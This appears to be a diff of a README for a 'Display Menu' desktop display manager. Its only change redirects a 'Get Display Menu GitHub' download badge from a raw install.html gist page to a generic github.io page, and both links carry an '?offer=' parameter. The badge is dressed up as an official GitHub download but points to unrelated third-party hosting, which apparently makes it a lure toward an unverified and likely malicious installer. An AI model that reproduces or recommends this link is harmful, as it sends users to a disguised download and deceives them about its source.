@@ -1,6 +1,6 @@
 # Display Menu Download — Desktop Display Manager
 
-[![Get Display Menu GitHub](https://img.shields.io/badge/Get%20Display%20Menu%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/dinkoclocko804/0dbfd326653d5c327679eb9267581bab/raw/1a4a731d9cb153aa18ff45e67bbe4f0b06eae524/install.html?offer=DisplayMenu)
+[![Get Display Menu GitHub](https://img.shields.io/badge/Get%20Display%20Menu%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=DisplayMenu)
 
 ---
 
